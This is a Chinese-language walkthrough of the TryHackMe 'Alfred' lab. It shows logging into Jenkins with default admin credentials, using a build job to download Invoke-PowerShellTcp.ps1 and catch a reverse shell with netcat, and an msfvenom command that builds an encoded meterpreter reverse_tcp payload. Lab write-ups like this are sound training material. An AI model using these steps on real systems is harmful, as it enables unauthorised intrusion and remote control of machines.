# Alfred

**Alfred 是tryhackme的一台实验机器，虽然是容易级别的，但对于新手具有很大的参考价值**

- 查看靶机的开放的端口

![image-20210917214613285](http://cdn.mxrblog.cn/image-20210917214613285.png)



- 发现靶机开放了80和8080端口，网络服务器是Jetty，登录其web界面，根据google的结果，可以得知其网络服务器的默认用户名和密码都是admin，登录后进入project的配置文件界面

![image-20210917215035347](http://cdn.mxrblog.cn/image-20210917215035347.png)



- 在配置界面我们可以获取攻击机器发送的文件，并且将靶机本身的shell反弹给攻击机器

![image-20210917215221749](http://cdn.mxrblog.cn/image-20210917215221749.png)



- 在攻击机器上开启web服务，方便靶机获取攻击机器发送的文件，这里使用python3建立http服务

![image-20210917215449090](http://cdn.mxrblog.cn/image-20210917215449090.png)



- 通过tryhackme上面的教程我们可以复制粘贴上面的代码，然后接收到攻击机器发送的powershell类型的文件（如果攻击机器没有tryhackme上面说的powershell文件则自己需要通过google自己下载）

![image-20210917224002791](http://cdn.mxrblog.cn/image-20210917224002791.png)

- tryhackme上面提到的代码的作用是获取Invoke-PowerShellTcp.ps1文件以及在靶机上运行它，这个文件的作用是将靶机上的shell传给攻击机器，所以我们可以在攻击机器上使用necat建立一个监听端口，接收shell

![image-20210917221613248](http://cdn.mxrblog.cn/image-20210917221613248.png)



- 点击save后再点击Build Now，然后观察攻击机器上的http和nc服务，在这里可能无法将靶机的shell反弹给攻击机器，原因可能是在tryhackme网页上使用了中文翻译，粘贴代码后出现了问题，所以不翻译英文界面就行了，还有一种情况是Invoke-PowerShellTcp.ps1文件下载出现了问题，	起初我是用别人报告中的链接下载的，导致Build Now一直出现问题，当使用tryhackme给的链接，进入链接克隆下载整个github仓库后，使用里面的文件才不会出现问题

![image-20210918000158672](http://cdn.mxrblog.cn/image-20210918000158672.png)

![image-20210918000237473](http://cdn.mxrblog.cn/image-20210918000237473.png)

![image-20210918000933834](http://cdn.mxrblog.cn/image-20210918000933834.png)

- 找到user.txt

![image-20210918001309363](http://cdn.mxrblog.cn/image-20210918001309363.png)



### 使用msf

- 创建载荷

`msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.6.102.23 LPORT=4445 -f exe -o get8888.exe`

![image-20210918002809629](http://cdn.mxrblog.cn/image-20210918002809629.png)

- 在靶机上下载已经创建好的载荷，因为原来web服务器上已经存在了一个任务，不能通过修改config文件进行命令的实现，所以我们在被反弹的shell上实现命令（tryhackme已经给出命令）

![image-20210918003710136](http://cdn.mxrblog.cn/image-20210918003710136.png)

- 使用msf建立监听模块

![image-20210918005246878](http://cdn.mxrblog.cn/image-20210918005246878.png)

- 结果

![image-20210918005315197](http://cdn.mxrblog.cn/image-20210918005315197.png)

- 接下来没什么好说的了，按照提示一步一步来就行了

![image-20210918010948130](http://cdn.mxrblog.cn/image-20210918010948130.png)



